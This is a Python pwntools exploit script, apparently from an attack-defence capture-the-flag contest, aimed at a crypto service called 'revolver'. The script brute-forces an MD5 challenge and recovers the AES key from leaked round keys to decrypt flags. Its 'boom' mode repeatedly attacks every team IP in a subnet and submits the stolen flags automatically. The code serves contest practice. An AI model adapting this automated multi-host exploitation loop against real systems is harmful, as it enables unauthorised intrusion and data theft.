#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from submit import submit_flag
from time import sleep
import threading
import os
from integral import round2master
from team import team

PREFIX = '172.16.5.'
TIMEOUT = 5 #TODO
DELAY = 60
LIST = range(10, 35) # victim pool
ME = 12
PORT = 5054

code = ELF('challs/revolver')
context.arch = code.arch
context.log_level = 'debug'
gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))

from hashlib import md5
from Crypto.Cipher import AES


n=73987797374151951781370452268001126363285717830362662907853749297550981365935180822074465434480351846327693684859838613977982273765527500563676847551411265449659875082316046332637357551047774600024684993188943879721915714789983278721475254014766573700511856676393909600789456199127072751315162015797723341127L

tab='_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+'

def brute(pre,tar):
    for c1 in tab:
        for c2 in tab:
            for c3 in tab:
                if md5(pre+c1+c2+c3).hexdigest()==tar:
                    return c1+c2+c3

def cubic(x):
    l=0
    r=x-1
    while l<r:
        mid=(l+r)/2
        tmp=pow(mid,3)
        if tmp>x:
            l=mid+1
        elif tmp<x:
            r=mid-1
        else:
            l=mid
            r=mid
    if pow(l,3)==x:
        return l
    if pow(r,3)==x:
        return r
    return -1

def exploit(c):
    #c = remote('172.16.9.8',9999)
    #c = remote('127.0.0.1',2333)
    rk=''
    c.sendlineafter('action:','2')
    c.sendlineafter('action:','1')
    c.sendlineafter('action:','1')
    c.recvuntil('opening:')
    stat = c.recv(46)
    #print stat
    aa,bb = stat.split('#')
    assert len(aa)==32
    assert len(bb)==13
    rem = brute(bb,aa)
    #print rem
    c.sendline(rem)
    c.sendlineafter('action:','3')
    c.sendlineafter('action:','1')
    c.recvuntil('encrypted flag:')
    flag=c.recvline()
    for i in range(1,3):
        c.sendlineafter('action:','3')
        c.sendlineafter('action:','5')
        c.sendlineafter('action:',str(i))
        c.recvuntil('hit:')
        tmp = c.recvline().strip()
        rk+=tmp

    rk = rk.decode('hex')
    mk=round2master(map(ord,rk),16)
    mk=''.join(map(chr,mk))

    #print flag
    flag=flag.strip().decode('hex')
    a=AES.new(mk)
    flag=a.decrypt(flag)
    #print flag
    c.close()
    return flag
def boom():
    context.log_level = 'info'
    while True:
        for i in LIST:
            if i == ME:
                continue
            ip = PREFIX + str(i)
            print 'pwning %s' % ip
            try:
                submit_flag(exploit(remote(ip, PORT, timeout=TIMEOUT)))
                success('pwned: %s %s' % (ip, team[ip]))
            except:
                warning('failed %s %s' % (ip, team[ip]))
        sleep(DELAY)

if len(sys.argv) > 2: # attack one
    submit_flag(exploit(remote(sys.argv[1], sys.argv[2], timeout=TIMEOUT)))
elif len(sys.argv) > 1:
    if sys.argv[1] == 'boom': # pwning all
        boom()
    else: # debug
        libc = ELF('/home/hdt/ldlibc/libc-2.24.dbg')
        os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
        exploit(code.process())
        #r = remote('127.0.0.1', 4444)
else: # local
    libc = code.libc
    exploit(code.process())

